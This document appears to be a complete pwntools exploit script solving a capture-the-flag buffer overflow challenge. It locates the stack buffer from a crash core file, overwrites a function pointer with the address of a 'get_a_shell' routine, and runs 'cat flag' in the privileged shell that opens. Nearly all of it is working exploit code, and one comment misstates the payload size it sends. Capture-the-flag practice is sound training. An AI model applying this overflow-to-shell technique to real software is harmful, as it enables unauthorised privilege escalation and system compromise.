# SETUP BOILERPLATE
from pwn import *
import os

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level11') # replace this with the actual level
get_a_shell = p32(elf.symbols["get_a_shell"])

# crash the process to get a core file and find the buffer address (still boilerplate)

io = elf.process(env={}, setuid=False)
io.sendline(cyclic(10000)) # send 1000 junk characters
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
os.unlink(core.path) # delete the file now that we're done with it

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript='''
    b *0x8048604
    continue
    ''')
else:
    io = elf.process(env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

max_len = 0x80
fn_address = 0xffffde20

payload = (fn_address - buffer_address) * b"A" + get_a_shell + (max_len - (fn_address - buffer_address)) * b"A"
io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
